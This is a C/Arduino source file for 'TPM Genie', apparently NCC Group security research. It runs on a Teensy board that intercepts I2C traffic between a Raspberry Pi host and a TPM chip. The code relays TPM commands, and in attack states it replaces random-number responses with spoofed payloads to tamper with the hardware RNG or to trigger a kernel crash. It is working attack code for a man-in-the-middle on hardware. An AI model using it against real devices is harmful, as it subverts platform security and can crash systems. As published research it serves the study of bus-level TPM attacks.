/*
 * TPM Genie
 * Interposer Attacks Against the Trusted Platform Module Serial Bus.
 * 
 * This application has been developed for the Teensy 3.6. The Teensy MCU will
 * interpose I2C traffic between the host (a RaspberryPi) and the TPM (an 
 * Infineon SLB9645). Full documentation can be found in the README files in
 * this repository.
 * 
 * Author: Jeremy Boone, NCC Group
 * Date  : November 10, 2017
 */

#include <i2c_t3.h> // Improved I2C library
#include "interposer.h"
#include "tpm_cmd_parser.h"
#include "payloads.h"
#include "pretty_print_packets.h"


// --------------------------------------------------------------------------
// Initialize the MCU
// --------------------------------------------------------------------------

// Infineon SLB9645 I2C slave address. 
#define INFINEON_SLAVE_ADDR 0x20

// Give better names to the Wire interfaces so my brain can keep track
#define WireHost Wire
#define WireTpm  Wire1

void setup( void ) {
  
  // Initialize serial port. We use UART to monitor the interposed TPM traffic.
  Serial.begin(1); // Don't need to specify baud rate for ttyACMO
  while(!Serial) {
    delay(50);
  }
  
  Serial.println();
  Serial.println();
  Serial.println("***********************************************************************************");
  Serial.println("****                                 TPM Genie                                 ****");
  Serial.println("****                           Jeremy Boone, NCC Group                         ****");
  Serial.println("***********************************************************************************");


  Serial.println("[*] Initializing I2C bus #0 w/ RaspberryPi (slave)"); 
  WireHost.begin( I2C_SLAVE, INFINEON_SLAVE_ADDR, I2C_PINS_18_19, I2C_PULLUP_EXT, 400000 );
  WireHost.onReceive( i2c_rx_from_host );
  WireHost.onRequest( i2c_tx_to_host );
  WireHost.setDefaultTimeout(250000);

  Serial.println("[*] Initializing I2C bus #1 w/ TPM (master)"); 
  WireTpm.begin(); // User Master defaults: external pullup, 400kHz, Pins 37/38
  WireTpm.setDefaultTimeout(250000);

  Serial.print( "[*] Starting up in default state: " );
  print_state();
  Serial.println();
  Serial.println( "[*]     You can press 'm' to switch states." );


  Serial.println("[*] Waiting for data...\n"); 
  pp_header();
}


// --------------------------------------------------------------------------
// I2C RX Functionality
// --------------------------------------------------------------------------


byte recvbuf[I2C_RX_BUFFER_LENGTH] = {0};

/*
 * Handler for I2C write operations from the Host.
 * 
 * This function parses the incoming data and attempts to figure out what operation 
 * the host is initiating. This could be a simple operation such as reading a status
 * register or a more complex operation such as writing a TPM command buffer.
 * 
 * The primary goals of this function is to: 
 *  1. Print a human readable representation of the input data.
 *  2. To update the state machine so that `i2c_tx_to_host` can do the right thing when
 *     the host requests a response at a later date.
 */
void i2c_rx_from_host( size_t num_bytes ) {

  if( WireHost.available() < 1 ) {
    Serial.println( "Host --> MITM: Error, received less than 1 byte." );
    return;
  }
  if( (size_t)WireHost.available() != num_bytes ) {
    Serial.print( "Host --> MITM: Error, Rx num_bytes mismatch " );
    Serial.print( WireHost.available() );
    Serial.print( " vs " );
    Serial.println( num_bytes );
    return;
  }

  // Receive data into buffer
  WireHost.read( recvbuf, num_bytes );
  parse_request( HOST_2_INTERPOSER, recvbuf, num_bytes );

  // Send data along to the TPM
  WireTpm.beginTransmission( INFINEON_SLAVE_ADDR ); // init for Tx send  
  WireTpm.write( recvbuf, num_bytes );              // send to Tx buffer
  WireTpm.endTransmission();                        // Send Tx data to Slave (non-blocking)
  parse_request( INTERPOSER_2_TPM, recvbuf, num_bytes );
}


// --------------------------------------------------------------------------
// I2C TX Functionality
// --------------------------------------------------------------------------

/*
 * Handler for I2C read operations from the Host.
 * 
 * This function has two modes of operation: 
 *  1. Interpose: Return spoofed data from payloads.h.
 *  2. Pass-Through: Return actual responses from the TPM.
 */
void i2c_tx_to_host( void ) {
  unsigned int i = 0;
  int expected_response_size;
  int bytes = 0;

  expected_response_size = predict_response_size( );
  if( expected_response_size == 0 ) {
    Serial.println( "Possible interposer bug, predicted response size is zero!" );
    expected_response_size = 1;
  }

  // The host asked us for data, so we must ask the TPM
  WireTpm.requestFrom( INFINEON_SLAVE_ADDR, expected_response_size );
  while( !WireTpm.available() ) {
    delay(50);
    Serial.print( "waiting for response... " );
    Serial.println( i );
    i += 1;
    if( i == 100 ){ return; }
  }

  // Actually get data from the TPM
  WireTpm.read( recvbuf, expected_response_size );

  // If we're in passthrough mode, just short circuit and return response now.
  if( STATE == STATE_PASSTHROUGH ) {
    bytes = WireHost.write( recvbuf, expected_response_size );
    if ( bytes != expected_response_size ) {
      Serial.println( "*********************************" );
      Serial.println( "Error" );
      Serial.println( "*********************************" );
    }
    parse_response( TPM_2_INTERPOSER,  recvbuf, expected_response_size );
    parse_response( INTERPOSER_2_HOST, recvbuf, expected_response_size );
    return;    
  }

  parse_response( TPM_2_INTERPOSER,  recvbuf, expected_response_size );

  // Otherwise, we may want to modify the data. So check the command ordinal and compare
  // it against the current state to decide if we want to inject our own payload.
  switch( prev_reg_write ) {
    // Currently, only support ability to modify response from the DATA_FIFO register.
    case TPM_DATA_FIFO:
      {
        // TODO: The following code is a bit fragile. If a response body size is 10, we 
        // may accidentally copy the header. Should re-use the get_header bool to track
        // whether we need to copy the header vs. body when interposing responses.
        switch( prev_command ) {
          case TPM_ORD_GetRandom:
            if( STATE == STATE_ALTER_HW_RNG ) {
              if( expected_response_size == 10 ) {
                memcpy(recvbuf, random_poc_hdr, expected_response_size );
              } else {
                memcpy(recvbuf, random_poc_bdy, expected_response_size );
              }  
            } else if( STATE == STATE_TRIGGER_KERNEL_CRASH ) {
              if( expected_response_size == 10 ) {
                memcpy(recvbuf, random_crash_poc_hdr, expected_response_size );
              } else {
                memcpy(recvbuf, random_crash_poc_bdy, expected_response_size );
              } 
            }
            break;
          default:
            break;
        }
      }
      break;

    // Don't do anything special for other TPM registers
    default:
      break;
  }

  // Send the data to the host
  bytes = WireHost.write( recvbuf, expected_response_size );
  if ( bytes != expected_response_size ) {
    Serial.println( "*********************************" );
    Serial.println( "Error" );
    Serial.println( "*********************************" );
  }
  parse_response( INTERPOSER_2_HOST, recvbuf, expected_response_size );
}


// --------------------------------------------------------------------------
// Main loop is rather boring ...
// --------------------------------------------------------------------------

void loop( void ) {
  // Check for commands on serial bus.
  if( Serial.available() > 0 ) {
    char c = Serial.read();
    if( c == 'm' ) {
      handle_command( c );
    } else {
      // Insert whitespace in the console output when you hit any other key.
      Serial.println( "\n" );
    }
  }

  // Do little to avoid a tight spin loop.
  // Its okay to delay, because the I2C onRequest/onReceive callbacks will interrupt a delay.
  delay(500);
}


